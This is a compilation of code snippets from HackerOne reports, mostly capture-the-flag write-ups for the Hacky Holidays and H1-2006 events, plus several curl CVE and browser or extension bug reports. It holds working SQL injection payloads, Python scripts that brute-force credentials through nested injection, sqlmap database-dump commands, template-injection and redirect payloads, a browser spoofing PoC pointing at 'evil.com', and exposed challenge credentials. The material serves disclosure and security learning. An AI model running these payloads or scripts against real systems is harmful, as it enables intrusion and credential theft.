The objective of this challenge is to access the admin space of the Grinch's forum. In the forum, we can identify the username `grinch` and `max`. Brute-forcing for passwords with these usernames does not give any result. A directory brute-force reveals the path `/forum/phpmyadmin`. Here, brute-forcing does also not lead to any further results. After further searches for Grinch-Networks on Google and Github, the source code of the forum could be discovered at `https://github.com/Grinch-Networks/forum`. Looking at the commits, the credentials for the phpmyadmin can be discovered in the ["Small fix" commit](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae). The credentials are `forum:6HgeAZ0qC9T6CQIqJpD`. Clicking through the pages we can discover MD5-hashed passwords for the grinch and max at `/forum/phpmyadmin?db=forum&table=user`. [Crackstation](https://crackstation.net/) can crack the password of the grinch.
```

## 175. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
The `hash` parameter appears to be an MD5-hash. Tinkering with either the `target` or `hash` parameter results in the response: `Invalid Protection Hash`. This tells us that some sort of validation of the target and hash parameter is performed. Since the target does not directly translate to the hash, we can guess that it is a salted hash. We can try to crack the hash with hashcat. Therefore, we store our information in the form `$pass:$salt` into a file called `hash.txt`:
```

## 176. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
```

## 177. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
```

## 178. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
```

## 179. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
```

## 180. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
```

## 181. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20ALL%20SELECT%20NULL,NULL,GROUP_CONCAT(%27\n%27,table_name)%20FROM%20information_schema.tables--%20-
```

## 182. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436' UNION ALL SELECT NULL,NULL,GROUP_CONCAT(UNION ALL SELECT NULL,NULL,NULL) FROM information_schema.tables WHERE table_name like 'a%'-- -
```

## 183. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,1 -- -",'12',1-- -
```

## 184. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
So, I was successfully able to change last character of line as ‘Y’, I login using that username and password and got the flag and also link to next challenge.
{F1132510}

Challenge 11: Grinch Recon
---------------------------
This is where things started to become tricky.
I browsed [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59][26] which I got from previous challenge and I was presented with the page
[26]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59            "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59"
{F1132536}
Showing API is in development so I visited [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api][27] and got information about api.
{F1132555}
So, I tried to find endpoints of API but for each request I always got response `{"error":"This endpoint cannot be visited from this IP address"}`, so we do not have access to api.(Probably a SSRF will help)
[27]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api       "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api"
On clicking any links on home page, we get a page with url [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k][28] with changed values of hash. I tried injecting it with `jdh34k'` but got 404 but when I injected it with `jdh34k' and 1=1 -- -` and I got page pack. BOOM!!! SQL injection.
[28]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k    "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k"
I used sqlmap to get all information from databases but didn't get any information that can help, so dead end for me.
Whenever I get a dead end, I go one step back so I went back to page which was showing images and checked the source of page and got some interesting thing.
# … truncated …
```

## 185. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
`$images` is the object containing names of images, so server takes names of images and creates a JSON object with `image` and `auth` parameters where in image parameter it adds image name to `r3c0n_server_4fdk59\/uploads\/imagename` and generates auth token for this and converts it to base64.
So, the goal here is to control name of image to achieve the SSRF.
Here nested SQL injection comes in play. The results returned by first query where we can inject contains 3 columns id, hash and name. Here we have inject control the id which is easy to control using union query like `abc` union select 1,1,'hash' -- -` but it is not enough, we have to control the data returned by next query, thanks to object property in php, we can can inject into next query by using union injection inside id
```

## 186. [#3788984](https://hackerone.com/reports/3788984)  -  CVE-2026-11564: Native CA trust persist
*low*

```sh
python3 _loose_review/valid/build_internal_poc.py build-review-native \
  _loose_review/valid/confirmed-valid/native-ca-state-persists-after-custom-ca/poc_native_ca_stale_after_custom_ca.c \
  build-review-native/poc_native_ca_stale_after_custom_ca
build-review-native/poc_native_ca_stale_after_custom_ca
```

## 187. [#1101882](https://hackerone.com/reports/1101882)  -  CVE-2021-22876: Automatic referer leaks credentials
*low*

```bash
$ curl -svLe ';auto' 'https://user:pass@curl.haxx.se#frag'  2>&1 >/dev/null | grep -i Referer:
```

## 188. [#1101882](https://hackerone.com/reports/1101882)  -  CVE-2021-22876: Automatic referer leaks credentials
*low*

```bash
$ curl -V                                                                                                
curl 7.64.1 (x86_64-apple-darwin19.0) libcurl/7.64.1 (SecureTransport) LibreSSL/2.8.3 zlib/1.2.11 nghttp2/1.39.2
Release-Date: 2019-03-27
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp 
Features: AsynchDNS GSS-API HTTP2 HTTPS-proxy IPv6 Kerberos Largefile libz MultiSSL NTLM NTLM_WB SPNEGO SSL UnixSockets
```

## 189. [#3733905](https://hackerone.com/reports/3733905)  -  CVE-2026-8924: trailing dot domain super cookie
*low*

```bash
curl 8.20.0 (x86_64-pc-linux-gnu) libcurl/8.20.0 OpenSSL/3.6.2 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3
.8 libpsl/0.21.5 libssh2/1.11.1 nghttp2/1.69.0 ngtcp2/1.22.1 nghttp3/1.15.0 mit-krb5/1.22.1 OpenLDAP/2.6.10 
Release-Date: 2026-04-29, security patched: 8.20.0-1 
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s
 rtsp scp sftp smtp smtps telnet tftp ws wss 
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz PSL 
SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

## 190. [#3733905](https://hackerone.com/reports/3733905)  -  CVE-2026-8924: trailing dot domain super cookie
*low*

```bash
CURL=/path/to/curl python3 curl_trailing_dot_psl_demo.py
```

## 191. [#374969](https://hackerone.com/reports/374969)  -  Navigation to protocol handler URL from the opened page displayed as a request from this page.
*medium*

```html
<script>
    window.onclick = () => {
        w = window.open("https://google.com")
        setTimeout(() => {
            t = w.location.replace('ssh://evil.com');
        }, 1000)
    }
</script>
```

## 192. [#373721](https://hackerone.com/reports/373721)  -  URL spoofing using protocol handlers
*medium*

```html
<script>
        window.onclick = () => {
            x = window.open('http.://google.com')
            setTimeout(() => {
                x.document.write(`Hello Google.com! <button onclick="alert('I can run JS on this page!')">Click me!</button>`)
            }, 1000)
        }
    </script>
```

## 193. [#395729](https://hackerone.com/reports/395729)  -  `socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension
*high*

```
### Websockets 101 (important for understanding)

> Websockets differs from XHRs - As opposite to XHR, CORS doesn't apply to WS.

1. Page could initiate WS connection to any cross-origin resource.
2. There is no browser-level mechanism to prevent WS connection from one origin to another. (like CORS for XHR)
3. Connection through `wss://` includes all user's cookies.

WS server is responsible for validating `Origin` header to check is connection trusted.

#### Example

1. `evil.com` sends XHR to `good.com` = CORS rejects requests (assuming no `Access-Control-Allow-Origin` was specified in response)
2. `evil.com`  connects to `ws://good.com` using WS = server at `good.com` is responsible for `Origin` header validation.

### Attack mechanism

[Page] -> (socket action) -> [Content script] -> (socket action) -> [Background page] -> [WS server]

### Summary [1/3]

Page could exploit "socket" command to :

1. connect to arbitrary WS endpoint from Grammarly extension origin
2. send arbitrary data from Grammarly extension origin to any WS endpoints

### `w.emit("message", t)` [received command vs background page]

You probably noticed this line in `t.onmessage` handler.
Shortly, background page handles events received from remote WS server.
Grammarly uses `wss://capi.grammarly.com/freews` endpoint for text processing.

> I guess "capi" is an abbreviature for Command API.

As of extension could connect to any WS endpoint, it will handle commands received from attacker's endpoint too.
# … truncated …
```

## 194. [#395729](https://hackerone.com/reports/395729)  -  `socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension
*high*

```
Shortly, `emitTo` emits the command (from attacker's server) from background page to content script.

### Summary [2/3]

Background page:
1. Connects to attacker's WS endpoint 
2. Receives a command from the WS endpoint
3. Handles received command
4. Sends received command to the content script

### \#394518

First of all, #394518 is about user data.
It's possible to get the latest available `socketId` property and send random malformed data to `capi.grammarly.com` under current `socketId`. However, I think it has zero impact :(

### received command vs content script

Received commands handled in next function:
```

## 195. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```
../../redirect?url=https:\/\/software.bountypay.h1ctf.com/uploads#
```

## 196. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 197. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```json
{{name}}
```

## 198. [#1065829](https://hackerone.com/reports/1065829)  -  Invading Grinch Network and Saving Christmas
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 199. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```json
{{template:cbdj3_grinch_footer.html}}
```

## 200. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```json
{{template:asdf}}
```

## 201. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```json
{{template:<filename>}}
```

## 202. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```
../../redirect?url=FUZZ&
```

## 203. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```json
{{email}}
```

## 204. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```json
{{flag}}
```

## 205. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```
${letter}
```

## 206. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```json
{{template:}}
```

## 207. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```json
{{test}}
```

## 208. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
${YELLOW}
```

## 209. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
${NORMAL}
```

## 210. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```python
#!/usr/bin/python3

import requests, time
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
    username = ""
    found = False
    for l in range(1,40):
        found = False
        for o in letters:
            session = requests.session()
            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?username={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(username+o)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                username = username + o
                print("Username till now {}".format(username))
                found = True
                break
        if found is False:
            break
# … truncated …
```

## 211. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```python
#!/usr/bin/python3

import requests, time
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
    password = ""
    found = False
    for l in range(1,40):
        found = False
        for o in letters:
            session = requests.session()
            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?password={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(password+o)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                password = password + o
                print("Password till now {}".format(password))
                found = True
                break
        if found is False:
            break
# … truncated …
```

## 212. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```json
{{template:PAYLOAD}}
```

## 213. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```json
{{template:chron0x}}
```

## 214. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```json
{{template: 38dhs_admins_only_header.html}}
```

## 215. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```
${img_url}
```

## 216. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```
${found}
```

## 217. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```json
{{template:RANDOMTHINGS}}
```

## 218. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```json
{{template:<TEMPLATE_NAME>}}
```

## 219. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```json
{{template:name of template}}
```

## 220. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```json
{{template:abc}}
```

## 221. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```json
{{something}}
```

## 222. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```json
{{newitem}}
```

## 223. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```json
{{givetemplate}}
```

## 224. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```json
{{template:XXXX}}
```

## 225. [#375259](https://hackerone.com/reports/375259)  -  Cross-origin page stays focused before/after downloading + uninformative modal window for download
*low*

```html
<script>
  function f() {
    w = window.open(`https://twitter.com`);
    setTimeout(() => {
      w.location.replace('./hello.jar')
    }, 3000)
  }
</script>
```

## 226. [#373721](https://hackerone.com/reports/373721)  -  URL spoofing using protocol handlers
*medium*

```html
<body>
    <script>
        window.onclick = () => {
            x = window.open('http.://google.com')
            setTimeout(() => {
                x.document.write(`Hello Google.com! <button onclick="alert('I can run JS on this page!')">Click me!</button>`)
            }, 1000)
        }
    </script>
</body>
```

## 227. [#1785378](https://hackerone.com/reports/1785378)  -  Double evaluation in .bash_prompt of dotfiles allows a malicious repository to execute arbitrary commands
*high*

```
${command_mark}
```

## 228. [#1785378](https://hackerone.com/reports/1785378)  -  Double evaluation in .bash_prompt of dotfiles allows a malicious repository to execute arbitrary commands
*high*

```
${color_user_host}
```

## 229. [#1785378](https://hackerone.com/reports/1785378)  -  Double evaluation in .bash_prompt of dotfiles allows a malicious repository to execute arbitrary commands
*high*

```
${color_reset}
```

## 230. [#1785378](https://hackerone.com/reports/1785378)  -  Double evaluation in .bash_prompt of dotfiles allows a malicious repository to execute arbitrary commands
*high*

```
${color_folder}
```

## 231. [#389108](https://hackerone.com/reports/389108)  -  Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin
*critical*

```
Page has to call `window.postMessage` with next object to call `fetch` from the extension
```

## 232. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```bash
./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ app
```

## 233. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

## 234. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```json
{"account_id":"../../redirect?url=https:\/\/software.bountypay.h1ctf.com/uploads#","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

## 235. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```markdown
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

## 236. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
Great! Luckily, searching for an `input` element starting with a `name` attribute with a value starting with `code` was my first (more or less educated) guess, but it took me some time to figure out the purpose of it. First I thought that it is just a single input field and wasted some time wondering why I did not get any results when querying for the content of the `value` attribute. After correctly guessing the next character, which was an underscore, it came to my mind that there could maybe be multiple `code_*` input fields and indeed: there is `code_1`  to `code_7`, which fits to the HTML `input` field for the challenge answer having a max length of 7. Therefore, I suspected that each input field contains one character of the 2FA code, which indeed was the case.

After knowing the input fields to target, I wrote a small bash script that generates an evil CSS stylesheet for revealing the values of those fields when the victim browser loads it instead of the real CSS:
```

## 237. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
As the browser only seems to load CSS from an SSL website, I wrote a small script for my evil HTTPS Server in Python and placed it on my VPS:
```

## 238. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```
After running the Python script and pointing the URL in the request to `https://[attackerserver]:9999/css`, the log output of the script looked as follows:
```

## 239. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" --current-db
```

## 240. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz --dump
```

## 241. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz -T admin --dump
```

## 242. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/{}
```

## 243. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/user?{}=
```

## 244. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

## 245. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
In short, the age parameter has to be numeric and less than 3 characters. At first thought, this might only allow a maximum age of 999. However, php also allows the scientific notation with the `e` character. For example `1e4` will be translated to `10000`. As we can see `1ex` fulfills our conditions: It is numeric, fewer characters than 3, and will extend our string.
With this knowledge we can register a new user and change the payload as follows:
```

## 246. [#1066135](https://hackerone.com/reports/1066135)  -  Wholesome Hacky Holidays: A Writeup
*critical*

```
The response of the request to fetch this image is `Expected HTTP status 200, Received: 404`. Now that we found the inception SQLi, lets write a small script to explore what we just did manually a bit more.
```

## 247. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```markdown
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

## 248. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```json
.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
```

## 249. [#1067835](https://hackerone.com/reports/1067835)  -  Hacky Holidays Writeup
*critical*

```
https://.../attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

## 250. [#1066206](https://hackerone.com/reports/1066206)  -  [hacky-holidays] Grinch network is down
*critical*

```html
value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
```

## 251. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
This indicates index.php file is present on webserver, on browsing [index.php][9], got a source code of index.php file.
[9]: https://hackyholidays.h1ctf.com/my-diary/?template=index.php       "index.php"
```

## 252. [#1067530](https://hackerone.com/reports/1067530)  -  Successfully took down the Grinch and saved the holidays from being ruined
*critical*

```
It checks using `is_numeric` php function. On documentation page of this function [here][24] we see in example that it also accepts ‘e’ as a valid [number][25].  After it checks if length is greater than 3 and then uses `intval` function to calculate integer value of a variable. So if we give number “`2e3`, it will pass the `is_numeric` and `strlen` check and final value after `inval` function will be `2000`, it adds number of zeros after e. So, we can use this to become admin. I sent a request with POST data,
```

## 253. [#1069388](https://hackerone.com/reports/1069388)  -  It's just a man on a mission
*critical*

```http
preview_markup=Hello+{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

## 254. [#369218](https://hackerone.com/reports/369218)  -  Navigation to restricted origins via "Open in new tab"
*medium*

```
${USERNAME_FROM_SSH}
```

## 255. [#369218](https://hackerone.com/reports/369218)  -  Navigation to restricted origins via "Open in new tab"
*medium*

```
${DOWNLOADED_FILE_NAME}
```

## 256. [#893395](https://hackerone.com/reports/893395)  -  [H1-2006 2020] CTF Writeup
*critical*

```python
import base64
import json
import requests
import sys


def submit(payload):
    url = "https://app.bountypay.h1ctf.com/statements?month=02&year=2019"
    token = { "hash": "de235bffd23df6995ad4e0930baac1a2", "account_id": f"../../redirect?url=https://software.bountypay.h1ctf.com/{payload}#" }
    cookies = { "token": base64.b64encode(json.dumps(token).encode()).decode() }
    res = requests.get(url, cookies=cookies)
    return res


def brute():
    with open("/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt") as f:
        for line in f:
            payload = line.strip()
            res = submit(payload)
            json_data = json.loads(res.text)
            data = json_data.get("data")
            url = json_data.get("url")
            if not "404 Not Found" in data:
                print(f"[+] {url}")
                print(data)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        brute()
    else:
        payload = sys.argv[1]
        res = submit(payload)
        print(res.status_code, res.text)
```

## 257. [#2931636](https://hackerone.com/reports/2931636)  -  ActionView sanitize helper bypass with style and math
*medium*

```ruby
<%= sanitize @comment.body, tags: ["math", "style"] %>
```

## 258. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Jun 2020 20:44:54 GMT
Content-Type: application/json
Connection: close
Content-Length: 489

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

## 259. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 30 May 2020 20:50:30 GMT
Content-Type: application/json
Connection: close
Content-Length: 104

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

## 260. [#889293](https://hackerone.com/reports/889293)  -  [H1-2006 2020] CTF Writeup!
*critical*

```http
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 12:08:04 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

## 261. [#1069080](https://hackerone.com/reports/1069080)  -  hackyholidays CTF Writeup
*critical*

```
README.md can be found under `https://hackyholidays.h1ctf.com/signup-manager` and tells us default credentials (`admin:password`) that do not work and that a zip archive named `signupmanager.zip` must be unzipped in order to deploy the application.
```

## 262. [#894623](https://hackerone.com/reports/894623)  -  @shakedko H1-2006 CTF writeup
*critical*

```bash
$ findomain -t bountypay.h1ctf.com

Target ==> bountypay.h1ctf.com

Searching in the Facebook API... 🔍
Searching in the Bufferover API... 🔍
Searching in the Threatminer API... 🔍
Searching in the AnubisDB API... 🔍
Searching in the CertSpotter API... 🔍
